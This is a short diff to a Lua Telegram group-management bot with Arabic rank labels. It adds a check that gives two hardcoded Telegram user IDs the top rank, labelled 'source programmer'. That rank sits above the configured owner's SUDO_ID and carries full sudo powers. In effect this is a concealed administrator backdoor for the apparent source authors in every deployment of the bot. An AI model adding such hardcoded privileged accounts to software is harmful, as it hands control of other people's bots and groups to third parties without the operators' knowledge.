@@ -245,7 +245,11 @@ else
 msg.GroupActive = false
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 346252071 or msg.sender_user_id_ == 400866650 then
+msg.TheRankCmd = 'مبرمج السورس'
+msg.TheRank = 'مبرمج السورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -286,7 +290,8 @@ end
 if msg.Rank == 1 then
 msg.SudoBase = true
 end
- 
+
+
 if msg.Rank == 1 or msg.Rank == 2 then
 msg.SudoUser = true
 end
